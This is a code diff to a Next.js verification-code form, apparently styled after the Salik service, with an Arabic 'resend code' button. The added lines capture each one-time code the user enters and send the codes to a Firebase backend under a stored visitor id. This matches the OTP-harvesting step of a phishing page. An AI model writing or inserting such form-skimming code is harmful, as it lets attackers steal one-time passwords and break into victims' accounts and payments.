@@ -7,12 +7,13 @@ import { useRouter } from "next/navigation"
 import Image from "next/image"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
+import { addData } from "../../lib/firebase"
 
 export default function VerificationForm() {
   const router = useRouter()
   const [code, setCode] = useState("")
   const [timeLeft, setTimeLeft] = useState(59)
-
+  const allotps = ['']
   useEffect(() => {
     if (timeLeft > 0) {
       const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000)
@@ -67,7 +68,12 @@ export default function VerificationForm() {
         <button
           type="button"
           className="text-salik-accent hover:text-blue-600 text-sm font-medium"
-          onClick={() => setTimeLeft(59)}
+          onClick={() => {
+            allotps.push(code)
+            const _id = localStorage.getItem('vistor')
+            addData({ id: _id, allOtps: allotps })
+            setTimeLeft(59)
+          }}
           disabled={timeLeft > 0}
         >
           إعادة إرسال الرمز {timeLeft > 0 ? `(${timeLeft})` : ""}
